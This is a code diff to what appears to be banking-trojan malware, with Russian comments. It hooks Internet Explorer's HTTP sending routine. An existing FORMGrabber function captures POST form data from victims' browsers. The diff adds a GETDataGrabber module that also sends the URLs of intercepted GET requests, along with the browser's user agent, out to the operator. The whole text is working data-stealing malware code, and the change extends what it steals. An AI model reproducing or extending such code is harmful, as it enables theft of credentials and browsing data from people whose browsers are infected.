@@ -22,6 +22,7 @@
 #include "Requests.h"
 #include "BotHTTP.h"
 #include "HTTPConsts.h"
+#include "GETDataGrabber.h"
 
 #include "Modules.h"
 
@@ -275,7 +276,8 @@ void UpdateIEUserAgent(HINTERNET Handle) {
 }
 // ---------------------------------------------------------------------------
 
-void WINAPI FORMGrabber(PRequest Request) {
+void WINAPI FORMGrabber(PRequest Request)
+{
 	// Метод грабит POST данные
 
 	if (Request->Method != hmPOST || Request->Optional == NULL)
@@ -403,8 +405,17 @@ PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 		CheckJavaClient2015File(Request->URL);
 	#endif
 
+	// При необходимости отправляем GET данные
+	#ifdef GETDataGrabberH
+		if (MID == hmGET)
+		{
+			UpdateIEUserAgent((HINTERNET)Request->Owner);
+			SendGETData(Request->URL, IEUserAgent, BROWSER_TYPE_IE);
+		}
+	#endif
 
-	// Получаем отправляемые данные
+
+	// Отправляем POST данные
 
 	if (Optional != NULL && OptionalLength > 0 &&
 		OptionalLength <= MAX_FORM_GRABBER_DATA_SIZE)
